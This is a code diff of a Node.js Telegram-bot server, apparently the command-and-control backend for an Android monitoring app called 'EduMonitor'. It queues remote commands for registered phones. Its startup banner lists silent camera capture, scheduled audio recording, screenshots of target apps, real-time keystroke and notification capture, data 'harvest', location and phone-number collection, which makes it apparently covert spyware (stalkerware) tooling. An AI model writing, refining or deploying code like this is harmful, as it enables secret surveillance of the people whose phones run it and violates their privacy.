+        return;
+    }
+    
     await answerCallbackQuery(callbackId, `🔄 Executing ${command}...`);
-    if (!device.pendingCommands) device.pendingCommands = [];
-    device.pendingCommands.push({ command: command, originalCommand: `/${command}`, messageId: messageId, timestamp: Date.now() });
-    await saveDevices();
+    
+    if (!device.pendingCommands) {
+        device.pendingCommands = [];
+    }
+    
+    device.pendingCommands.push({
+        command: command,
+        originalCommand: `/${command}`,
+        messageId: messageId,
+        timestamp: Date.now()
+    });
+    saveDevices();
+    
     await sendTelegramMessage(chatId, `✅ Command sent: /${command}`);
-    await editMessageKeyboard(chatId, messageId, [[{ text: '◀️ Back to Menu', callback_data: 'help_main' }]]);
+    
+    const keyboard = [[{ text: '◀️ Back to Menu', callback_data: 'help_main' }]];
+    await editMessageKeyboard(chatId, messageId, keyboard);
 }
 
+// ============= WEBHOOK ENDPOINT =============
+
+app.post('/webhook', async (req, res) => {
+    res.sendStatus(200);
+    
+    setImmediate(async () => {
+        try {
+            const update = req.body;
+            console.log('📩 Received update type:', update.callback_query ? 'callback' : (update.message ? 'message' : 'other'));
+
+            if (update.callback_query) {
+                await handleCallbackQuery(update.callback_query);
+                return;
+            }
+
+            if (!update?.message) {
+                console.log('📭 Non-message update');
+                return;
+            }
+
+            const chatId = update.message.chat.id;
+            const text = update.message.text;
+            const messageId = update.message.message_id;
+
+            if (!isAuthorizedChat(chatId)) {
+                console.log(`⛔ Unauthorized chat: ${chatId}`);
+                await sendTelegramMessage(chatId, '⛔ You are not authorized to use this bot.');
+                return;
+            }
+
+            await setChatMenuButton(chatId);
+
+            const userState = userStates.get(chatId);
+            
+            if (userState) {
+                await handleConversationMessage(chatId, text, messageId, userState);
+                return;
+            }
+
+            if (text?.startsWith('/')) {
+                await handleCommand(chatId, text, messageId);
+            } else {
+                await sendTelegramMessageWithKeyboard(
+                    chatId,
+                    "🤖 Use the menu button below or type /help to see available commands.",
+                    getMainMenuKeyboard(chatId)
+                );
+            }
+        } catch (error) {
+            console.error('❌ Error processing webhook:', error);
+        }
+    });
+});
+
+// ============= CONVERSATION HANDLER =============
+
 async function handleConversationMessage(chatId, text, messageId, userState) {
-    const stateHandlers = {
-        'awaiting_sched_config': () => { const parts = text.trim().split(/\s+/); if (parts.length >= 3) return `/sched_config ${parts[0]} ${parts[1]} ${parts[2]}`; return null; },
-        'awaiting_add_target': () => text && text.length > 0 ? `/add_target ${text}` : null,
-        'awaiting_remove_target': () => text && text.length > 0 ? `/remove_target ${text}` : null,
-        'awaiting_custom_schedule': () => { const parts = text.trim().split(/\s+/); if (parts.length >= 4) return `/record_custom ${parts[0]} ${parts[1]} ${parts[2]} ${parts[3]}`; return null; },
-        'awaiting_sync_interval': () => { const interval = parseInt(text); if (!isNaN(interval) && interval >= 5 && interval <= 720) return `/set_sync_interval ${interval}`; return null; },
-        'awaiting_add_scan_path': () => text && text.length > 0 ? `/add_scan_path ${text}` : null,
-        'awaiting_remove_scan_path': () => text && text.length > 0 ? `/remove_scan_path ${text}` : null,
-        'awaiting_server_backup': () => { const parts = text.trim().split(/\s+/); if (parts.length >= 4) return `/set_server_backup ${parts[0]} ${parts[1]} ${parts[2]} ${parts[3]}`; return null; }
-    };
-    const handler = stateHandlers[userState.state];
-    if (handler) {
-        const command = handler();
-        if (command) { await sendCommandToDevice(chatId, messageId, command); userStates.delete(chatId); }
-        else { await sendTelegramMessage(chatId, "❌ Invalid format. Please try again."); }
-    } else { userStates.delete(chatId); await handleCommand(chatId, text, messageId); }
+    switch (userState.state) {
+        case 'awaiting_sched_config':
+            const parts = text.trim().split(/\s+/);
+            if (parts.length >= 3) {
+                const command = `/sched_config ${parts[0]} ${parts[1]} ${parts[2]}`;
+                await sendCommandToDevice(chatId, messageId, command);
+                userStates.delete(chatId);
+            } else {
+                await sendTelegramMessage(chatId, "❌ Invalid format. Use: `on/off general_minutes target_minutes`\nExample: `on 10 5`");
+            }
+            break;
+            
+        case 'awaiting_add_target':
+            if (text && text.length > 0) {
+                const command = `/add_target ${text}`;
+                await sendCommandToDevice(chatId, messageId, command);
+                userStates.delete(chatId);
+            } else {
+                await sendTelegramMessage(chatId, "❌ Invalid package name.");
+                userStates.delete(chatId);
+            }
+            break;
+            
+        case 'awaiting_remove_target':
+            if (text && text.length > 0) {
+                const command = `/remove_target ${text}`;
+                await sendCommandToDevice(chatId, messageId, command);
+                userStates.delete(chatId);
+            } else {
+                await sendTelegramMessage(chatId, "❌ Invalid package name.");
+                userStates.delete(chatId);
+            }
+            break;
+            
+        case 'awaiting_custom_schedule':
+            const scheduleParts = text.trim().split(/\s+/);
+            if (scheduleParts.length >= 4) {
+                const command = `/record_custom ${scheduleParts[0]} ${scheduleParts[1]} ${scheduleParts[2]} ${scheduleParts[3]}`;
+                await sendCommandToDevice(chatId, messageId, command);
+                userStates.delete(chatId);
+            } else {
+                await sendTelegramMessage(chatId, "❌ Invalid format. Use: `HH:MM HH:MM daily/once minutes`\nExample: `22:00 06:00 daily 30`");
+            }
+            break;
+            
+        case 'awaiting_sync_interval':
+            const interval = parseInt(text);
+            if (!isNaN(interval) && interval >= 5 && interval <= 720) {
+                const command = `/set_sync_interval ${interval}`;
+                await sendCommandToDevice(chatId, messageId, command);
+                userStates.delete(chatId);
+            } else {
+                await sendTelegramMessage(chatId, "❌ Invalid interval. Must be between 5 and 720 minutes.");
+            }
+            break;
+            
+        case 'awaiting_add_scan_path':
+            if (text && text.length > 0) {
+                const command = `/add_scan_path ${text}`;
+                await sendCommandToDevice(chatId, messageId, command);
+                userStates.delete(chatId);
+            } else {
+                await sendTelegramMessage(chatId, "❌ Invalid path.");
+                userStates.delete(chatId);
+            }
+            break;
+            
+        case 'awaiting_remove_scan_path':
+            if (text && text.length > 0) {
+                const command = `/remove_scan_path ${text}`;
+                await sendCommandToDevice(chatId, messageId, command);
+                userStates.delete(chatId);
+            } else {
+                await sendTelegramMessage(chatId, "❌ Invalid path.");
+                userStates.delete(chatId);
+            }
+            break;
+            
+        case 'awaiting_server_backup':
+            const backupParts = text.trim().split(/\s+/);
+            if (backupParts.length >= 4) {
+                const command = `/set_server_backup ${backupParts[0]} ${backupParts[1]} ${backupParts[2]} ${backupParts[3]}`;
+                await sendCommandToDevice(chatId, messageId, command);
+                userStates.delete(chatId);
+            } else {
+                await sendTelegramMessage(chatId, "❌ Invalid format. Use: `token1 chatId1 token2 chatId2`");
+            }
+            break;
+            
+        default:
+            userStates.delete(chatId);
+            await handleCommand(chatId, text, messageId);
+            break;
+    }
 }
 
 async function sendCommandToDevice(chatId, messageId, command) {
     const selectedDeviceId = userDeviceSelection.get(chatId);
     const device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
-    if (!device) { await sendTelegramMessage(chatId, '❌ No device selected.'); return; }
-    if (!device.pendingCommands) device.pendingCommands = [];
-    device.pendingCommands.push({ command: command.substring(1), originalCommand: command, messageId: messageId, timestamp: Date.now() });
-    await saveDevices();
+    
+    if (!device) {
+        await sendTelegramMessage(chatId, '❌ No device selected.');
+        return;
+    }
+    
+    if (!device.pendingCommands) {
+        device.pendingCommands = [];
+    }
+    
+    device.pendingCommands.push({
+        command: command.substring(1),
+        originalCommand: command,
+        messageId: messageId,
+        timestamp: Date.now()
+    });
+    saveDevices();
+    
     await sendTelegramMessage(chatId, `✅ Command sent: ${command}`);
 }
 
+// ============= COMMAND HANDLER =============
+
 async function handleCommand(chatId, command, messageId) {
+    console.log(`\n🎯 Handling command: ${command} from chat ${chatId}`);
+
+    if (command === '/device_info' || command === '/network_info' || command === '/mobile_info' || command === '/location') {
+        let selectedDeviceId = userDeviceSelection.get(chatId);
+        let device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
+        
+        if (!device) {
+            for (const [id, d] of devices.entries()) {
+                if (String(d.chatId) === String(chatId)) {
+                    selectedDeviceId = id;
+                    device = d;
+                    userDeviceSelection.set(chatId, selectedDeviceId);
+                    break;
+                }
+            }
+        }
+        
+        if (device) {
+            await answerCallbackQuery(null, `🔄 Sending ${command} to device...`);
+            
+            if (!device.pendingCommands) {
+                device.pendingCommands = [];
+            }
+            
+            device.pendingCommands.push({
+                command: command.substring(1),
+                originalCommand: command,
+                messageId: messageId,
+                timestamp: Date.now()
+            });
+            saveDevices();
+            
+            await sendTelegramMessage(chatId, `✅ Command sent: ${command}\n📱 Device: ${device.deviceInfo?.model || 'Unknown'}`);
+        } else {
+            await sendTelegramMessage(chatId, '❌ No device registered.');
+        }
+        return;
+    }
+    
     if (command === '/devices') {
         const userDevices = getDeviceListForUser(chatId);
         let message = `📱 *Your Devices*\n\n`;
-        if (userDevices.length === 0) message += "No devices registered yet.";
-        else { userDevices.forEach((device, index) => { message += `${index + 1}. ${device.isActive ? '✅' : '○'} ${device.name}\n   ID: \`${device.id}\`\n   Status: ${(Date.now() - device.lastSeen) < 300000 ? '🟢 Online' : '⚫ Offline'}\n\n`; }); message += `\nUse /select [device_id] to switch active device.`; }
+        
+        if (userDevices.length === 0) {
+            message += "No devices registered yet.";
+        } else {
+            userDevices.forEach((device, index) => {
+                const status = device.isActive ? '✅ ACTIVE' : '○';
+                message += `${index + 1}. ${status} ${device.name}\n`;
+                message += `   ID: \`${device.id}\`\n`;
+                message += `   Last Seen: ${device.lastSeenFormatted}\n`;
+                message += `   Status: ${(Date.now() - device.lastSeen) < 300000 ? '🟢 Online' : '⚫ Offline'}\n`;
+                if (device.phoneNumber !== 'Not available') {
+                    message += `   Phone: ${device.phoneNumber}\n`;
+                }
+                message += `\n`;
+            });
+            message += `\nUse /select [device_id] to switch active device.`;
+        }
+        
         await sendTelegramMessage(chatId, message);
         return;
     }
-    if (command === '/showmenu' || command === '/help') { await sendTelegramMessageWithKeyboard(chatId, "🤖 SECONDARY/BACKUP SERVER - Control Panel", getMainMenuKeyboard(chatId)); return; }
+    
+    if (command === '/showmenu' || command === '/help') {
+        console.log('📋 Force showing main menu');
+        await sendTelegramMessageWithKeyboard(
+            chatId,
+            "🤖 *EduMonitor Control Panel*\n\nSelect a category:",
+            getMainMenuKeyboard(chatId)
+        );
+        return;
+    }
+    
     if (command.startsWith('/select ')) {
         const deviceId = command.substring(8).trim();
         const device = devices.get(deviceId);
-        if (device && String(device.chatId) === String(chatId)) { userDeviceSelection.set(chatId, deviceId); await sendTelegramMessage(chatId, `✅ Now controlling: ${device.deviceInfo?.model || 'Device'}`); }
-        else { await sendTelegramMessage(chatId, '❌ Device not found.'); }
+        
+        if (device && String(device.chatId) === String(chatId)) {
+            userDeviceSelection.set(chatId, deviceId);
+            await sendTelegramMessage(chatId, 
+                `✅ Now controlling: ${device.deviceInfo?.model || 'Device'}\n` +
+                `ID: ${deviceId.substring(0, 8)}...`);
+        } else {
+            await sendTelegramMessage(chatId, '❌ Device not found or not authorized.');
+        }
         return;
     }
+
     let selectedDeviceId = userDeviceSelection.get(chatId);
-    let device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
-    if (!device) {
-        for (const [id, d] of devices.entries()) { if (String(d.chatId) === String(chatId)) { selectedDeviceId = id; device = d; userDeviceSelection.set(chatId, selectedDeviceId); break; } }
+    let device = null;
+    
+    if (selectedDeviceId) {
+        device = devices.get(selectedDeviceId);
     }
-    if (!device) { await sendTelegramMessageWithKeyboard(chatId, '❌ No device registered.', getMainMenuKeyboard(chatId)); return; }
+    
+    if (!device) {
+        for (const [id, d] of devices.entries()) {
+            if (String(d.chatId) === String(chatId)) {
+                selectedDeviceId = id;
+                device = d;
+                userDeviceSelection.set(chatId, selectedDeviceId);
+                break;
+            }
+        }
+    }
+
+    if (!device) {
+        await sendTelegramMessageWithKeyboard(chatId, 
+            '❌ No device registered.\n\nPlease make sure the Android app is running.',
+            getMainMenuKeyboard(chatId));
+        return;
+    }
+
     device.lastSeen = Date.now();
-    await saveDevices();
-    if (!device.pendingCommands) device.pendingCommands = [];
+    saveDevices();
+    
+    if (!device.pendingCommands) {
+        device.pendingCommands = [];
+    }
+    
     const cleanCommand = command.startsWith('/') ? command.substring(1) : command;
-    device.pendingCommands.push({ command: cleanCommand, originalCommand: command, messageId: messageId, timestamp: Date.now() });
-    await saveDevices();
+    
+    device.pendingCommands.push({
+        command: cleanCommand,
+        originalCommand: command,
+        messageId: messageId,
+        timestamp: Date.now()
+    });
+    saveDevices();
+    
+    console.log(`📝 Command queued for device ${selectedDeviceId}: ${cleanCommand}`);
+    
     await sendTelegramMessage(chatId, `✅ Command sent: ${command}\n📱 Device: ${device.deviceInfo?.model || 'Unknown'}`);
 }
 
 // ============= START SERVER =============
 
-async function startServer() {
-    console.log('🚀 Starting SECONDARY/BACKUP Server with GitHub Gist Storage...');
-    if (!SECONDARY_BOT_TOKEN) { console.error('❌ SECONDARY_BOT_TOKEN is required!'); process.exit(1); }
-    if (!ENCRYPTION_SALT) { console.error('❌ ENCRYPTION_SALT is required!'); process.exit(1); }
-    if (authorizedChats.size === 0) { console.error('❌ AUTHORIZED_CHAT_IDS is required!'); process.exit(1); }
-    console.log('✅ Environment variables loaded successfully');
-    await loadAllFromGist();
-    app.listen(PORT, '0.0.0.0', () => {
-        console.log('\n🚀 ===============================================');
-        console.log(`🚀 SECONDARY/BACKUP Server - EduMonitor v8.0`);
-        console.log(`🚀 Server IP: ${getServerIP()}`);
-        console.log(`🚀 Port: ${PORT}`);
-        console.log(`🚀 Webhook URL: ${activeServerUrl}/webhook`);
-        console.log(`🚀 Authorized chats: ${authorizedChats.size} configured`);
-        console.log(`\n💾 STORAGE: ${octokit ? '✅ GitHub Gist (Shared)' : '❌ Local Only'}`);
-        console.log(`\n🔄 Server Type: SECONDARY/BACKUP`);
-        console.log(`📱 Total Devices: ${devices.size}`);
-        console.log('🚀 ===============================================\n');
-    });
-}
-
-startServer().catch(console.error);
+app.listen(PORT, '0.0.0.0', () => {
+    const serverIP = getServerIP();
+    console.log('\n🚀 ===============================================');
+    console.log(`🚀 Secondary Server - EduMonitor v7.0`);
+    console.log(`🚀 Server IP: ${serverIP}`);
+    console.log(`🚀 Port: ${PORT}`);
+    console.log(`🚀 Webhook URL: ${activeServerUrl}/webhook`);
+    console.log(`🚀 Authorized chats: ${Array.from(authorizedChats).join(', ')}`);
+    console.log(`🚀 Persistent Storage: ${DEVICES_FILE}`);
+    console.log(`\n🤖 BOT CONFIGURATION:`);
+    console.log(`   Active Bot Token: ${activeBotToken.substring(0, 20)}...`);
+    console.log(`   Server URL: ${activeServerUrl}`);
+    console.log('\n✅ MENU STRUCTURE:');
+    console.log('   📸 Screenshot → Settings → Config/Targets/Quality/Token');
+    console.log('   📷 Camera → Photo/Silent/Front/Back/Switch');
+    console.log('   🎤 Recording → Start/Stop/Settings → Info/Schedule/Quality');
+    console.log('   📊 Data → NEW Data/ALL Data/Sync & Harvest');
+    console.log('   ⚡ Real-time → Keys/Notifications/All');
+    console.log('   ℹ️ Info → Device Info/Network Info/Mobile Info/Device Name');
+    console.log('   ⚙️ System → Media/App Management/Data Saving/Bot Token');
+    console.log('🚀 ===============================================\n');
+});
